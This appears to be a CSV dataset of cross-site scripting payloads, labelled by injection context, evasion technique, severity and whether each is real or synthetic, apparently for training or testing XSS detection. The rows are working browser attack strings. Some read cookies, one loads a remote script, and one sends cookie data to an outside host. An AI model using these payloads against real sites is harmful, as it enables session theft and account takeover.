payload,context,technique,severity,length,source
"<style>:target {color:red;}</style><button id=x style=""transition:color 1s"" ontransitionstart=alert(1)></button>",event_handler,none,medium,112,real
"<style>:target {color:red;}</style><footer id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></footer>",event_handler,none,medium,116,real
"<template onclick=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,53,real
"<figure draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</figure>",event_handler,none,medium,90,real
<script>/x/prompt(loc&#97;tion.h&#97;sh)</script>,script_injection,synthetic,medium,49,synthetic
"&lt;A HREF=\""http&#58;//66&#46;102&#46;7&#46;147/\""&gt;AnonKryptiQuz&lt;/A&gt;",generic,html_entity,low,78,real
""" onbegin=confirm(1) """,attribute_escape,synthetic,medium,22,synthetic
<svG oNmoUseOveR=aLerT(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,40,synthetic
"<style>:target {color: red;}</style><s id=x style=""transition:color 10s"" ontransitioncancel=print()></s>",event_handler,none,low,104,real
%22 onmouseenter=confirm(document.cookie) %22,attribute_escape,synthetic,medium,45,synthetic
<menuitem onpointerout=alert(1) style=display:block>AnonKryptiQuz</menuitem>,event_handler,none,medium,76,real
<bdi id=x tabindex=1 ondeactivate=alert(1)></bdi><input id=y autofocus>,event_handler,none,medium,71,real
""" onload=prompt('XSS') """,attribute_escape,synthetic,medium,24,synthetic
"%3Csvg onmouseover=prompt(String.fromCharCode(88,83,83))/%3E",tag_injection,synthetic,medium,60,synthetic
"<title id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></title>",event_handler,none,medium,86,real
<svg ontoggle=\u0061lert(document.cookie)/>,tag_injection,synthetic,medium,43,synthetic
<article onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</article><input value=clickme>,event_handler,none,medium,105,real
""" on&#101;rror=prompt(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,49,synthetic
"<svg width=""200"" height=""200"" xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"">",tag_injection,none,low,108,real
<form onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,54,real
""" onerror=\u0061lert(String.fromCharCode(88,83,83)) """,attribute_escape,synthetic,medium,53,synthetic
<x/onclick=globalThis&lsqb;’\u0070r\u006f’+’mpt’]&lt;)>clickme,event_handler,unicode_escape,low,62,real
<button popovertarget=x>Click me</button><picture onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</picture>,event_handler,none,medium,110,real
%27 onclick=prompt(document.domain) %27,attribute_escape,synthetic,medium,39,synthetic
<animatetransform onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,66,real
"<command onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</command>",event_handler,none,medium,90,real
<scRipT>/*/cOnfIrm(1)</sCriPt>,script_injection,synthetic,medium,30,synthetic
"<ins onmouseout=""alert(1)"">AnonKryptiQuz</ins>",event_handler,none,medium,46,real
"<param draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</param>",event_handler,none,medium,88,real
"<audio src=1 href=1 onerror=""javascript:alert(5920)""></audio>",event_handler,none,medium,61,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><hgroup id=x style=""position:absolute;"" onanimationcancel=""print()""></hgroup>",event_handler,none,low,181,real
<picture id=x tabindex=1 onfocus=alert(1)></picture>,event_handler,none,medium,52,real
"<style>@keyframes x{}</style><ul style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></ul>",event_handler,none,medium,97,real
"<input4 draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</input4>",event_handler,none,medium,89,real
' ontoggl&#101;=prompt(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,51,synthetic
<i id=x tabindex=1 onbeforeactivate=alert(1)></i>,event_handler,none,medium,49,real
"<th onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</th>",event_handler,none,medium,57,real
"<figcaption onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",event_handler,none,medium,79,real
video-js.swf?readyFunction=alert(1),generic,none,medium,35,real
<svG oNbeGin=alErt(1)>,tag_injection,synthetic,medium,22,synthetic
"嘼""><svg onload=prompt(document.domain);>",event_handler,none,medium,40,real
"<img src=1 href=1 onerror=""javascript:alert('HEJAP ZAIRY AL-SHARIF')""></img>",event_handler,none,medium,76,real
"<col draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,64,real
<svg onlo&#97;d=consol&#101;.log(1)>,tag_injection,synthetic,medium,36,synthetic
"<var draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</var>",event_handler,none,medium,79,real
<main onpointerdown=alert(1) style=display:block>AnonKryptiQuz</main>,event_handler,none,medium,69,real
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></svg>",event_handler,none,medium,124,real
<svG oNfoCus=coNfiRm(DocUmeNt.DomAin)>,tag_injection,synthetic,medium,38,synthetic
"""><xss/contenteditable/autofocus/onfocus=""alert(1)"">%232%20AnonKryptiQuz</xss>",event_handler,url_encoding,medium,78,real
"<style>:target {transform: rotate(180deg);}</style><figure id=x style=""transition:transform 2s"" ontransitionrun=print()></figure>",event_handler,none,low,129,real
<noframes id=x tabindex=1 ondeactivate=alert(1)></noframes><input id=y autofocus>,event_handler,none,medium,81,real
<nextid onpointerover=alert(1) style=display:block>AnonKryptiQuz</nextid>,event_handler,none,medium,73,real
""" onfocus=alert(1) autofocus=""",attribute_escape,synthetic,medium,30,synthetic
"<fieldset draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</fieldset>",event_handler,none,medium,74,real
"<html onMouseWheel html onMouseWheel=""javascript:javascript:alert(1)""></html onMouseWheel>",event_handler,none,medium,90,real
"<image onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</image>",event_handler,none,medium,63,real
"<input type=image src onerror=""prompt(1)"">",event_handler,none,medium,42,real
"<bdo oncut=""alert(1)"" contenteditable>AnonKryptiQuz</bdo>",event_handler,none,medium,57,real
<marquee><script>alert('XSS')</script></marquee>,script_injection,none,medium,48,real
<scRipT>/*/pRomPt(DocUmeNt.CooKie)</ScrIpt>,script_injection,synthetic,medium,43,synthetic
<tr onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,52,real
"<dd onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</dd>",event_handler,none,medium,65,real
"<span onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></span>",event_handler,none,medium,281,real
' onmous&#101;&#101;nt&#101;r=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) ',attribute_escape,synthetic,medium,73,synthetic
"<noscript onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</noscript>",event_handler,none,medium,92,real
"<img oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</img>",event_handler,none,medium,69,real
"<col onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</col>",event_handler,none,medium,68,real
"<wbr onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</wbr>",event_handler,none,medium,67,real
"""`'><script>\x0Bjavascript:alert(0186)</script>",script_injection,none,medium,47,real
<keygen onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</keygen><input value=clickme>,event_handler,none,medium,103,real
"<ul onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</ul>",event_handler,none,medium,57,real
"<dl onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</dl>",event_handler,none,medium,66,real
"<canvas draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</canvas>",event_handler,none,medium,70,real
"<label onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</label>",event_handler,none,medium,67,real
<SCRIPT SRC=http://ha.ckers.org/xss.js?<B>,script_injection,case_variation,low,42,real
"""><svg onlo&#97;d=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83))>",tag_injection,synthetic,medium,73,synthetic
"<html draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</html>",event_handler,none,medium,86,real
<big onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</big><input value=clickme>,event_handler,none,medium,106,real
"<embed onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</embed>",event_handler,none,medium,67,real
"<svg onclick=confirm(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,62,synthetic
"<article draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,91,real
%22><svg onbegin=confirm(document.domain)>,tag_injection,synthetic,medium,42,synthetic
<nav onpointerover=alert(1) style=display:block>AnonKryptiQuz</nav>,event_handler,none,medium,67,real
"<content onmouseup=""alert(1)"">AnonKryptiQuz</content>",event_handler,none,medium,53,real
"&lt;DIV STYLE=\""background-image&#58; url(javascript&#058;alert('AnonKryptiQuz'))\""&gt;",generic,html_entity,medium,87,real
<meta id=x tabindex=1 ondeactivate=alert(1)></meta><input id=y autofocus>,event_handler,none,medium,73,real
%3Csvg ontoggle=console.log(document.domain)/%3E,tag_injection,synthetic,medium,48,synthetic
<header id=x tabindex=1 ondeactivate=alert(1)></header><input id=y autofocus>,event_handler,none,medium,77,real
<img src=`%00`&NewLine; onerror=alert(1)&NewLine;,event_handler,url_encoding,medium,49,real
<button popovertarget=x>Click me</button><mark onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</mark>,event_handler,none,medium,104,real
""" oNfoCus=alErt(StRinG.fRomChaRCoDe(88,83,83)) """,attribute_escape,synthetic,medium,48,synthetic
<p onpointerout=alert(1) style=display:block>AnonKryptiQuz</p>,event_handler,none,medium,62,real
<code onpointerover=alert(1) style=display:block>AnonKryptiQuz</code>,event_handler,none,medium,69,real
<ol id=x tabindex=1 onbeforeactivate=alert(1)></ol>,event_handler,none,medium,51,real
"<del onmouseup=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,45,real
"<style>:target {color: red;}</style><tt id=x style=""transition:color 10s"" ontransitioncancel=print()></tt>",event_handler,none,low,106,real
<svg onerror=console.log(1)/>,tag_injection,synthetic,medium,29,synthetic
<marquee contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,61,real
""" onfocus=consol&#101;.log('XSS') &#97;utofocus=""",attribute_escape,synthetic,medium,49,synthetic
<svg onmous&#101;ov&#101;r=&#97;l&#101;rt('XSS')>,tag_injection,synthetic,medium,49,synthetic
"""><svg onlo&#97;d=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,59,synthetic
' ontoggle=\u0061lert(1) ',attribute_escape,synthetic,medium,26,synthetic
"<IMG SRC=x onwaiting=""alert(String.fromCharCode(88,83,83))"">",event_handler,encoding|case_variation,medium,60,real
"<template draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</template>",event_handler,none,medium,69,real
"""%3E%3Csvg onbegin=confirm(location.hash)%3E",tag_injection,synthetic,medium,44,synthetic
"<style>:target {color: red;}</style><tbody id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></tbody>",event_handler,none,medium,113,real
"<style>@keyframes slidein {}</style><figure style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></figure>",event_handler,none,medium,172,real
"<del draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</del>",event_handler,none,medium,64,real
<script>confirm`document.domain`</script>,script_injection,synthetic,medium,41,synthetic
"<brute+onbeforescriptexecute=a=alert,a(1%26%23x29>",event_handler,url_encoding,low,50,real
"<label draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</label>",event_handler,none,medium,88,real
"<aside oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,98,real
<tfoot id=x tabindex=1 onactivate=alert(1)></tfoot>,event_handler,none,medium,51,real
<input onauxclick=alert(1)>,event_handler,none,medium,27,real
"<iframe2 draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</iframe2>",event_handler,none,medium,92,real
<select id=x tabindex=1 ondeactivate=alert(1)></select><input id=y autofocus>,event_handler,none,medium,77,real
"<command onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</command>",event_handler,none,medium,70,real
"EvaL(""ConFirM(dOcuMenT.dOmaIn)"")",dom_sink,synthetic,medium,32,synthetic
<scRipT>cOnsOle.loG`dOcuMenT.cOokIe`</sCriPt>,script_injection,synthetic,medium,45,synthetic
<Script>window.valueOf=alert;window%2B1</Script>,script_injection,url_encoding|case_variation,low,48,real
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",js_uri,case_variation,medium,86,real
"""><svg ontoggle=\u0061lert(document.cookie)>",tag_injection,synthetic,medium,44,synthetic
"<shadow onmousedown=""alert(1)"">AnonKryptiQuz</shadow>",event_handler,none,medium,53,real
"%E5%98%8D%E5%98%8A%20""><svg onload=alert(1)>",event_handler,url_encoding,medium,44,real
<table onpointerout=alert(1) style=display:block>AnonKryptiQuz</table>,event_handler,none,medium,70,real
"<style>@keyframes slidein {}</style><form style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></form>",event_handler,none,medium,162,real
"<caption onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</caption>",event_handler,none,medium,76,real
"<base draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,61,real
"<td onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</td>",event_handler,none,medium,66,real
"';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//\"";alert(String.fromCharCode(88,83,83))//--></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,encoding|case_variation,medium,231,real
"""><svg onmouseover=console.log(1)>",tag_injection,synthetic,medium,34,synthetic
%3Csvg onmouseenter=console.log(1)/%3E,tag_injection,synthetic,medium,38,synthetic
"<var oncut=""alert(1)"" contenteditable>AnonKryptiQuz</var>",event_handler,none,medium,57,real
<picture onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</picture><input value=clickme>,event_handler,none,medium,114,real
"<script>$=~[];$={___:++$,$$$$:(![]+"""")[$],__$:++$,$_$_:(![]+"""")[$],_$_:++$,$_$$:({}+"""")[$],$$_$:($[$]+"""")[$],_$$:++$,$$$_:(!""""+"""")[$],$__:++$,$_$:++$,$$__:({}+"""")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"""")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"""")[$.__$])+((!$)+"""")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""""+"""")[$.__$])+($._=(!""""+"""")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""""+"""")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+""\""""+$.$_$_+(![]+"""")[$._$_]+$.$$$_+""\\""+$.__$+$.$$_+$._$_+$.__+""(""+$.___+"")""+""\"""")())();</script>",script_injection,none,low,550,real
"<script onmouseenter=""alert(1)"">AnonKryptiQuz</script>",script_injection,none,medium,54,real
""" onfocus=prompt(1) autofocus=""",attribute_escape,synthetic,medium,31,synthetic
"""><Svg onErrOr=ConFirM(lOcaTioN.hAsh)>",tag_injection,synthetic,medium,38,synthetic
<html onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</html><input value=clickme>,event_handler,none,medium,108,real
"<form id=""AnonKryptiQuz"" /><button form=""AnonKryptiQuz"" formaction=""javascript:javascript:alert(1)"">X",js_uri,none,medium,101,real
"<div id=""109""><svg xmlns=""http://www.w3.org/2000/svg"">",tag_injection,none,low,54,real
<script onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,56,real
"<set onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,68,real
javascr	ipt:confirm(document.cookie),js_uri,synthetic,medium,36,synthetic
%3Csvg%20onload=alert(%22MrHex88%22)%3E,event_handler,url_encoding,medium,39,real
"<canvas onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",event_handler,none,medium,73,real
%3Csvg onmouseenter=confirm(document.domain)/%3E,tag_injection,synthetic,medium,48,synthetic
"<style>:target {color:red;}</style><label id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></label>",event_handler,none,medium,114,real
<mark onpointerover=alert(1) style=display:block>AnonKryptiQuz</mark>,event_handler,none,medium,69,real
"<audio onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</audio>",event_handler,none,medium,70,real
"""><svg ontoggl&#101;=consol&#101;.log(1)>",tag_injection,synthetic,medium,41,synthetic
"<set draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,82,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><code id=x style=""position:absolute;"" onanimationcancel=""print()""></code>",event_handler,none,low,177,real
<script>javascript:alert(4696)<\x00/script>,script_injection,none,medium,43,real
"<style>:target {color:red;}</style><meter id=x style=""transition:color 1s"" ontransitionend=alert(1)></meter>",event_handler,none,medium,108,real
"<STYLE>li {list-style-image: url(\""javascript:alert('XSS')\"");}</STYLE><UL><LI>XSS",js_uri,case_variation,medium,82,real
%3Csvg onmouseenter=confirm('XSS')%3E,tag_injection,synthetic,medium,37,synthetic
"<main draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</main>",event_handler,none,medium,66,real
"""><svg onbegin=console.log('XSS')>",tag_injection,synthetic,medium,34,synthetic
"<listing draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,91,real
"<listing onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,75,real
<button popovertarget=x>Click me</button><figure onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</figure>,event_handler,none,medium,108,real
"<noembed draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</noembed>",event_handler,none,medium,87,real
"<br oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
"<ruby oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
<body onpointerenter=alert(1) style=display:block>AnonKryptiQuz</body>,event_handler,none,medium,70,real
<form id=test onforminput=javascript:alert(8938)><input></form><button form=test onformchange=javascript:alert(8938)>X,event_handler,none,medium,118,real
"<em onmouseup=""alert(1)"">AnonKryptiQuz</em>",event_handler,none,medium,43,real
""" onmous&#101;ov&#101;r=prompt(1) """,attribute_escape,synthetic,medium,35,synthetic
<meter onpointerout=alert(1) style=display:block>AnonKryptiQuz</meter>,event_handler,none,medium,70,real
<scRipT>/X/cOnfIrm(doCumEnt.coOkiE)</scRipT>,script_injection,synthetic,medium,44,synthetic
"<font draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</font>",event_handler,none,medium,85,real
<style onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"<object onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</object>",event_handler,none,medium,73,real
<body onmessage=alert(1)>,event_handler,none,medium,25,real
"<figcaption onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</figcaption>",event_handler,none,medium,73,real
""" onlo&#97;d=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,48,synthetic
"""><svg onmous&#101;&#101;nt&#101;r=prompt('XSS')>",tag_injection,synthetic,medium,49,synthetic
%22><svg onmouseenter=confirm(document.cookie)>,tag_injection,synthetic,medium,47,synthetic
&lt;svg/onload=&#39;alert&amp;#40 23 &amp;#41;&#39;&gt;,event_handler,html_entity,low,55,real
"<style>@keyframes x{}</style><dialog style=""animation-name:x"" onanimationend=""alert(1)""></dialog>",event_handler,none,medium,97,real
""";document.body.addEventListener(""DOMActivate"",confirm(1))//",dom_sink,none,medium,60,real
"<custom tags onscrollend=alert(1) style=""display:block;overflow:auto;border:1px dashed;width:500px;height:100px;""><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><span id=x>AnonKryptiQuz</span></custom tags>",event_handler,none,medium,295,real
<tt onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
&lt;BASE HREF=&quot;javascript:alert(&apos;XSS&apos;);//&quot;&gt;,js_uri,none,medium,66,real
"<style>@keyframes slidein {}</style><rp style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></rp>",event_handler,none,medium,158,real
"document.write(""%3Cimg src=x onerror=confirm(String.fromCharCode(88,83,83))%3E"")",dom_sink,synthetic,medium,80,synthetic
"<img oncontextmenu=""alert(1)"">AnonKryptiQuz</img>",event_handler,none,medium,49,real
%27 onclick=confirm(document.cookie) %27,attribute_escape,synthetic,medium,40,synthetic
%27 onbegin=prompt(document.domain) %27,attribute_escape,synthetic,medium,39,synthetic
"<a href=""javascript\x09:javascript:alert(1397)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
"<multicol oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,102,real
"<tbody onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</tbody>",event_handler,none,medium,71,real
"<template onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</template>",event_handler,none,medium,77,real
"<i onmouseout=""alert(1)"">AnonKryptiQuz</i>",event_handler,none,medium,42,real
javascr	ipt:alert(document.cookie),js_uri,synthetic,medium,34,synthetic
"<body onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</body>",event_handler,none,medium,70,real
""" onclick=prompt(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,medium,41,synthetic
"<dialog onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</dialog>",event_handler,none,medium,73,real
<img src=x onerror=URL='javascript:confirm(1)'>,event_handler,none,medium,47,real
<svG oNbeGin=prOmpT(1)>,tag_injection,synthetic,medium,23,synthetic
"<section draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</section>",event_handler,none,medium,67,real
""" onclick=\u0061lert(document.domain) """,attribute_escape,synthetic,medium,39,synthetic
"<meter onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</meter>",event_handler,none,medium,71,real
<img onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</img><input value=clickme>,event_handler,none,medium,97,real
<button popovertarget=x>Click me</button><multicol onbeforetoggle=alert(1) popover id=x>AnonKryptiQuz</multicol>,event_handler,none,medium,112,real
"<span draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</span>",event_handler,none,medium,81,real
<svg onerror=console.log(1)>,tag_injection,synthetic,medium,28,synthetic
"data:text/html,<script>alert(0)</script>",script_injection,none,medium,40,real
""" ontoggle=console.log(location.hash) """,attribute_escape,synthetic,medium,39,synthetic
' onclick=consol&#101;.log(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,51,synthetic
<img onerror=a[%00]lert(1) src=a>,event_handler,url_encoding,low,33,real
""" onmous&#101;ov&#101;r=confirm(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,59,synthetic
"<article onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</article>",event_handler,none,medium,73,real
<svg onmouseenter=alert(location.hash)>,tag_injection,synthetic,medium,39,synthetic
"<style>:target {color:red;}</style><summary id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></summary>",event_handler,none,medium,118,real
""" onbegin=console.log(document.cookie) """,attribute_escape,synthetic,medium,40,synthetic
"<script>function x(window) { eval(location.hash.substr(1)) }</script><iframe id=iframe src=%22javascript:parent.x(window)%22><iframe>#var xhr = new window.XMLHttpRequest();xhr.open('GET', 'http://xssme.html5sec.org/xssme2', true);xhr.onload = function() { alert(xhr.responseText.match(/cookie = '(.*?)'/)[1]) };xhr.send();",script_injection,encoding|url_encoding,high,322,real
<video onpointerout=alert(1) style=display:block>AnonKryptiQuz</video>,event_handler,none,medium,70,real
"<style>@keyframes x{}</style><basefont style=""animation-name:x"" onanimationstart=""alert(1)""></basefont>",event_handler,none,medium,103,real
%27 onbegin=alert(document.domain) %27,attribute_escape,synthetic,medium,38,synthetic
"<form onmouseup=""alert(1)"">AnonKryptiQuz</form>",event_handler,none,medium,47,real
"<svG oNmoUseOveR=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))>",tag_injection,synthetic,medium,60,synthetic
<tbody onpointerleave=alert(1) style=display:block>AnonKryptiQuz</tbody>,event_handler,none,medium,72,real
<figcaption id=x tabindex=1 ondeactivate=alert(1)></figcaption><input id=y autofocus>,event_handler,none,medium,85,real
"<plaintext onmousedown=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,59,real
""" oNtoGglE=pRomPt(DocUmeNt.DomAin) """,attribute_escape,synthetic,medium,36,synthetic
"<var onmouseleave=""alert(1)"">AnonKryptiQuz</var>",event_handler,none,medium,48,real
j&#97;vascript:alert(location.hash),js_uri,synthetic,medium,35,synthetic
<scRipT>aLerT`dOcuMenT.cOokIe`</sCriPt>,script_injection,synthetic,medium,39,synthetic
<scRipT>/*/cOnfIrm('XSS')</ScrIpt>,script_injection,synthetic,medium,34,synthetic
<svg/onload=location=‘javas’%2B‘cript:’%2B,event_handler,url_encoding,low,42,real
"<script draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</script>",script_injection,none,medium,90,real
"<spacer onmousemove=""alert(1)"">AnonKryptiQuz</spacer>",event_handler,none,medium,53,real
<track onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
"<style>:target {color: red;}</style><embed id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></embed>",event_handler,none,medium,113,real
"<IMG SRC=""`<javascript:alert>`('AnonKryptiQuz')""",js_uri,case_variation,low,48,real
"<col onmouseover=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,47,real
"<tfoot draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</tfoot>",event_handler,none,medium,68,real
login?redirectUrl=javascript%3avar{a%3aonerror}%3d{a%3aalert}%3bthrow%2520document.domain,dom_sink,url_encoding,low,89,real
"<article onmousemove=""alert(1)"">AnonKryptiQuz</article>",event_handler,none,medium,55,real
"<style>:target {color: red;}</style><param id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></param>",event_handler,none,medium,113,real
<q contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,55,real
"<div draggable=""true"" contenteditable>drag me</div><label ondragover=alert(1) contenteditable>drop here</label>",event_handler,none,medium,111,real
<div onpointerleave=alert(1) style=display:block>AnonKryptiQuz</div>,event_handler,none,medium,68,real
"<svg onfocus=consol&#101;.log(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,71,synthetic
